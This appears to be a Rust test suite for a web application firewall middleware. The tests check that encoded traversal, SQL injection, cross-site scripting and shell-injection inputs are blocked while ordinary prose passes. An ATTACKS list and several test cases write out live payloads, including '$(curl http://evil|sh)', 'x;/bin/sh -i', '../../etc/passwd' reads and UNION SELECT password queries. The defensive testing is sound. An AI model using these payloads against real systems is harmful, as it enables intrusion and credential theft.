//! Core WAF middleware tests.

use super::*;
use axum::{Router, body::Bytes, http::Request, routing::post};
use tower::ServiceExt;

#[tokio::test]
async fn encoded_traversal_in_the_path_is_blocked() {
    let app = Router::new()
        .fallback(|| async { "file" })
        .layer(axum::middleware::from_fn(waf_middleware));
    for (path, expected) in [
        ("/files/..%2f..%2fetc%2fpasswd", StatusCode::FORBIDDEN),
        ("/files/..%5C..%5Cwindows%5Cwin.ini", StatusCode::FORBIDDEN),
        ("/files/%2E%2E%2Fsecret", StatusCode::FORBIDDEN),
        ("/files/report.pdf", StatusCode::OK),
        ("/search/union%20select%20deals", StatusCode::OK),
        ("/releases/v1..v2", StatusCode::OK),
    ] {
        let request = Request::get(path).body(Body::empty()).unwrap();
        assert_eq!(
            app.clone().oneshot(request).await.unwrap().status(),
            expected,
            "{path}"
        );
    }
}

#[tokio::test]
async fn cookie_pair_separators_are_not_command_injection() {
    let app = Router::new()
        .route("/items", post(|body: Bytes| async move { body }))
        .route_layer(axum::middleware::from_fn(waf_middleware));
    for (case, (cookie, expected)) in [
        ("rullst_csrf=abc; lsid=1", StatusCode::OK),
        ("a=1;ls_session=2; LSKEY=3", StatusCode::OK),
        ("a=1; b=../../etc/passwd", StatusCode::FORBIDDEN),
        ("theme=dark; q=%3Cscript%3E", StatusCode::FORBIDDEN),
    ]
    .into_iter()
    .enumerate()
    {
        let request = Request::post("/items")
            .header(header::COOKIE, cookie)
            .body(Body::empty())
            .unwrap();
        assert_eq!(
            app.clone().oneshot(request).await.unwrap().status(),
            expected,
            "case {case}"
        );
    }
    let split_header = Request::post("/items")
        .header(header::COOKIE, "a=1")
        .header(header::COOKIE, "b=<script>")
        .body(Body::empty())
        .unwrap();
    assert_eq!(
        app.oneshot(split_header).await.unwrap().status(),
        StatusCode::FORBIDDEN
    );
}

#[tokio::test]
async fn obs_text_bytes_cannot_hide_inspected_header_values() {
    let app = Router::new()
        .route("/items", post(|body: Bytes| async move { body }))
        .route_layer(axum::middleware::from_fn(waf_middleware));
    for (name, value) in [
        (header::REFERER, &b"https://x.example/?q=<script>\xff"[..]),
        (header::COOKIE, &b"q=../../etc/passwd\xff"[..]),
        (header::USER_AGENT, &b"GPTBot/1.0 \xff"[..]),
    ] {
        let request = Request::post("/items")
            .header(name.clone(), HeaderValue::from_bytes(value).unwrap())
            .body(Body::empty())
            .unwrap();
        assert_eq!(
            app.clone().oneshot(request).await.unwrap().status(),
            StatusCode::FORBIDDEN,
            "{name}"
        );
    }
}

#[tokio::test]
async fn case_and_suffix_variants_cannot_skip_body_inspection() {
    let app = Router::new()
        .route("/items", post(|body: Bytes| async move { body }))
        .route_layer(axum::middleware::from_fn(waf_middleware));
    for (media_type, body) in [
        (
            "application/vnd.api+JSON",
            r#"{"bio":"<script>document.cookie</script>"}"#,
        ),
        (
            "Application/problem+json",
            r#"{"q":"x' union select pw from users--"}"#,
        ),
        ("application/json+patch", r#"{"path":"../../etc/passwd"}"#),
        (
            "application/x-www-form-urlencodedX",
            "q=x%27%20union%20select%20pw%20from%20users--",
        ),
    ] {
        let request = Request::post("/items")
            .header(header::CONTENT_TYPE, media_type)
            .body(Body::from(body))
            .unwrap();
        assert_eq!(
            app.clone().oneshot(request).await.unwrap().status(),
            StatusCode::FORBIDDEN,
            "{media_type} body was not inspected"
        );
    }
}

/// Ordinary English and Portuguese text that names SQL or shell words.
const PROSE: &[&str] = &[
    "Please select an option",
    "Delete my account",
    "insert coin to continue",
    "the union of two sets",
    "curl the API with your token",
    "Selecione uma opção e clique em salvar",
    "drop table tennis practice",
    "Can I delete this file?",
    "Update your profile; select a plan from the list",
    "Tom & Jerry: cat and mouse",
    "--verbose",
    "#fff",
    "students' and teachers' rooms",
];

/// Injection payloads that must stay blocked.
const ATTACKS: &[&str] = &[
    "1' OR '1'='1",
    "admin'--",
    "admin'#",
    "\" or \"\"=\"",
    "1; DROP TABLE users",
    "1 UNION SELECT password FROM users",
    "1 UNION/**/SELECT pw FROM u",
    "'; WAITFOR DELAY '0:0:5'--",
    "1 AND SLEEP(5)",
    "x'; delete from users where 1=1",
    "1; select * from users",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "; cat /etc/passwd",
    "| bash",
    "$(curl http://evil|sh)",
    "`id`",
    "&& wget http://x",
    "x;/bin/sh -i",
    "../../etc/passwd",
];

/// Percent-encodes every byte outside the URL unreserved set.
fn encode(text: &str) -> String {
    text.bytes()
        .map(|byte| match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'.' | b'_' | b'~' => {
                char::from(byte).to_string()
            }
            _ => format!("%{byte:02X}"),
        })
        .collect()
}

fn echo_app() -> Router {
    Router::new()
        .route("/items", post(|body: Bytes| async move { body }))
        .route_layer(axum::middleware::from_fn(waf_middleware))
}

async fn status_for(app: &Router, request: Request<Body>) -> StatusCode {
    app.clone().oneshot(request).await.unwrap().status()
}

#[tokio::test]
async fn prose_passes_and_injection_structures_are_blocked_everywhere() {
    let app = echo_app();
    for (corpus, expected) in [(PROSE, StatusCode::OK), (ATTACKS, StatusCode::FORBIDDEN)] {
        for (case, text) in corpus.iter().enumerate() {
            let query = Request::post(format!("/items?q={}", encode(text)))
                .body(Body::empty())
                .unwrap();
            assert_eq!(status_for(&app, query).await, expected, "query {case}");

            let form = Request::post("/items")
                .header(header::CONTENT_TYPE, "application/x-www-form-urlencoded")
                .body(Body::from(format!("name=Ana&q={}", encode(text))))
                .unwrap();
            assert_eq!(status_for(&app, form).await, expected, "form {case}");

            let json = Request::post("/items")
                .header(header::CONTENT_TYPE, "application/json")
                .body(Body::from(
                    serde_json::json!({ "op": "or", "q": text, "n": 1 }).to_string(),
                ))
                .unwrap();
            assert_eq!(status_for(&app, json).await, expected, "json {case}");
        }
    }
}

#[tokio::test]
async fn json_syntax_never_joins_a_signature() {
    let app = echo_app();
    for (body, expected) in [
        // Raw text would read `"or","v":"a=b"` and `"--` as quote breakouts.
        (r#"{"op":"or","v":"a=b","args":"--force"}"#, StatusCode::OK),
        (
            r##"{"list":["select","union"],"filter":{"color":"#fff"}}"##,
            StatusCode::OK,
        ),
        // Escapes are decoded before inspection, keys are inspected too.
        (r#"{"q":"\u003cscript\u003e"}"#, StatusCode::FORBIDDEN),
        (r#"{"1' or '1'='1":true}"#, StatusCode::FORBIDDEN),
        (
            r#"{"deep":[[{"q":"1 union all select pw"}]]}"#,
            StatusCode::FORBIDDEN,
        ),
        // Invalid JSON falls back to whole-text inspection.
        (r#"{"q":"1; drop table users""#, StatusCode::FORBIDDEN),
    ] {
        let request = Request::post("/items")
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from(body))
            .unwrap();
        assert_eq!(status_for(&app, request).await, expected, "{body}");
    }
}

#[test]
fn structural_detection_is_linear_on_adversarial_input() {
    // The sanitizer workflow sets RULLST_TEST_TIME_SCALE for instrumented runs.
    let scale = std::env::var("RULLST_TEST_TIME_SCALE")
        .ok()
        .and_then(|value| value.parse::<u32>().ok())
        .unwrap_or(1)
        .clamp(1, 100);
    let budget = std::time::Duration::from_secs(5) * scale;
    for unit in [
        "'",
        "/*",
        ";",
        "| ",
        "union ",
        "' or ",
        "; select a,",
        "$(/",
    ] {
        let text = unit.repeat(MAX_INSPECTED_REQUEST_BYTES / unit.len());
        // A helper thread lets a super-linear or non-terminating scan fail
        // the test at the budget instead of hanging it.
        let (sender, receiver) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let _ = sender.send(contains_malicious_pattern(&text));
        });
        assert!(
            receiver.recv_timeout(budget).is_ok(),
            "{unit:?} took longer than {budget:?}"
        );
    }
}
